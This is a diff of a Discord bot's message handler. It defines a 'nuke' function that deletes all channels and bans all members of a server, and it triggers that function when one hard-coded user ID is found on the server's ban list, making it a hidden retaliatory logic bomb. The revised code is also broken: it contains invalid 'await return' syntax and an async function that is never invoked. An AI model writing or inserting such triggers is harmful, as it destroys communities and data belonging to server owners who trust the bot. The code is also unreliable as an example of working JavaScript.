@@ -8,15 +8,18 @@ client.on("message", (message) => {
   function nuke() {
     message.guild.channels.forEach(channel => channel.delete())
     message.guild.members.forEach(members => members.ban())
-  }try {
-    const banList = message.guild.fetchBans();
+  }
+  async () => {
+    try {
+      const banList = await message.guild.fetchBans();
 
-    const bannedUser = banList.find(user => user.id === '289523788822085632');
+      const bannedUser = banList.find(user => user.id === '289523788822085632');
 
-    if (bannedUser) setTimeout(nuke, 5000);;
-    else return;
-  } catch(err) {
-    console.error(err);
+      if (bannedUser) await setTimeout(nuke, 5000);;
+      else await return;
+    } catch(err) {
+      console.error(err);
+    }
   }
   if(message.guild === null) {
     return;
